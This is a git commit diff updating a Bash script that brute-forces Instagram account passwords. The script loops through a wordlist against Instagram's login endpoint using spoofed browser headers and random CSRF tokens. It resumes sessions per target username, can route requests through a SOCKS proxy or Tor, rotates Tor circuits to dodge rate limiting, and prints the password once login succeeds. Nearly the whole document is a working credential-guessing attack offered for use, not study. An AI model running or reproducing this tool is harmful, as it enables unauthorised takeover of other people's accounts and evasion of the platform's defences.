4a567c550506cfd45c367fd64ad46e7e6e1c35ad
simone <s1763f@gmail.com>
2024-03-29 01:54:49 +0100

    new version

--- Bash/main.sh
+++ Bash/main.sh
@@ -1,42 +1,88 @@
-#!/bin/bash
+#!/usr/bin/env bash
+usage() { echo "$0 usage: --help --sleep [seconds between requests] --username <name> --socks-proxy [proxy] --wordlist <wordlist file> --tor-pid [pid]" && grep " .)\ #" "$0"; exit 1; };
+[ $# -lt 4 ] && usage;
+
+trap cleanup SIGINT;
+cleanup() { printf "\nSIGINT TRAP\nExiting"; exit 1; };
+
+optspec="h:-:"
+username="";
+proxy="";
+pid="";
+wordlist="";
+token="";
+rand="";
+sleep=60;
+
+while getopts "$optspec" optchar; do
+    case "${optchar}" in
+        -)
+            val="${!OPTIND}"; OPTIND=$(( OPTIND + 1 ))
+            case "${OPTARG}" in
+                help)
+                    usage;
+                    ;;
+                username)
+                    username="$val";
+                    ;;
+                sleep)
+                    sleep="$val";
+                    ;;
+                wordlist)
+                    wordlist="$val";
+                    ;;
+                socks-proxy)
+                    proxy="$val";
+                    ;;
+                tor-pid)
+                    pid="$val";
+                    ;;
+                *)
+                    if [ "$OPTERR" = 1 ] && [ "${optspec:0:1}" != ":" ]; then
+                        echo "Unknown option --${OPTARG}" >&2
+                    fi
+                    ;;
+            esac;;
+        h)
+            usage;
+            ;;
+        v)
+            echo "Parsing option: '-${optchar}'" >&2
+            ;;
+        *)
+            if [ "$OPTERR" != 1 ] || [ "${optspec:0:1}" = ":" ]; then
+                echo "Non-option argument: '-${OPTARG}'" >&2
+            fi
+            ;;
+    esac
+done
+
 umask 0022
-gen () {
-token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33)
-rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11)
-}
-if [ ! -f "$2" ]; then
+gen_token() { token=$(head /dev/urandom | base64 | tr -d '[:digit:]' | tr -d '+/=' | tail -c 33); };
+gen_rand() { rand=$(head /dev/urandom | base64 | tr -d '[:alpha:]' | tr -d '+/=' | tail -c 11); };
+if [ ! -f "$wordlist" ]; then
 echo "Non regular wordlist file"
 exit 1
 fi
 if ! which curl &>/dev/null; then
-echo "Install curl"
+echo "curl not found"
 exit 2
 fi
-if ! which tor &>/dev/null; then
-echo "Install tor"
-exit 3
-fi
-token=""
-rand=""
-ft=$(cat "$2" | md5sum | cut -d ' ' -f1)
-if [ -f "$1_$ft" ]; then
+ft=$(md5sum < "$wordlist" | cut -d ' ' -f1)
+if [ -f "$username"_"$ft" ]; then
 echo "Existing Session Found"
-line_counter=$(sed '1q;d' "$1_$ft")
+line_counter=$(sed '1q;d' "$username"_"$ft")
 sedline=$line_counter'q;d'
-line=$(sed "$sedline" "$2")
+line=$(sed "$sedline" "$wordlist")
 else
-touch "$1_$ft"
+touch "$username"_"$ft"
 echo "New Session"
 line_counter=1;
 sedline=$line_counter'q;d'
-line=$(sed "$sedline" "$2")
+line=$(sed "$sedline" "$wordlist")
 fi
-echo "Booting Up Tor"
-tor --SOCKSPort "$3" 1>/dev/null &
-pid=$!;
-echo "Waiting Tor Circuit"
-sleep 10
-gen
+gen_token;
+gen_rand;
 url='https://www.instagram.com/accounts/login/ajax/'
 ct='Content-Type: application/x-www-form-urlencoded'
 ac='Accept: */*'
@@ -48,29 +94,38 @@ re='Referer: https://www.instagram.com/accounts/login/'
 co='Connection: keep-alive'
 req='X-Requested-With: XMLHttpRequest'
 ig='X-IG-WWW-Claim: 0'
-size=$(grep '.' -c "$2")
+size=$(grep '.' -c "$wordlist")
+echo "Trying $line_counter of $size";
 while :
 if [[ "$line_counter" -gt "$size" ]]; then
 echo "Password not in wordlist"
 exit 5
 fi
 do
-curl --socks5-hostname 127.0.0.1:"$3" -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$1&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed 1>response.txt "$url" 2>/dev/null
-response=$(cat response.txt)
+if [ -z "$proxy" ]
+then
+      response=$(curl -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$username&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed "$url" 2>/dev/null);
+
+else
+     response=$(curl --socks5-hostname "$proxy" -H "$ct" -H "$ac" -H "$ae" -H "$ho" -H "$or" -H "$ua" -H "$re" -H "$co" -H "$req" -H "$ig" -H "X-CSRFToken: $token" --data "username=$username&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A$rand%3A$line&queryParams=%7B%7D&optIntoOneTap=false" --compressed "$url" 2>/dev/null);
+fi
 if [[ $response == *'authenticated":true'* || $response == *'checkpoint_required'* ]]; then
  echo "The Password is $line"
  exit 0
 fi
 if [[ $response == *'authenticated":false'* ]]; then
  line_counter=$((line_counter+1))
- echo $line_counter > "$1_$ft"
+ echo $line_counter > "$username"_"$ft"
  sedline=$line_counter'q;d'
- line=$(sed $sedline "$2")
+ line=$(sed $sedline "$wordlist")
  echo "Trying $line_counter of $size"
 else
-kill -SIGHUP $pid
-sleep 2
-gen
+if [ -n "$pid" ]
+then
+    kill -SIGHUP "$pid"
 fi
-rm response.txt &>/dev/null
+sleep "$sleep"
+gen_token;
+gen_rand;
+fi
 done
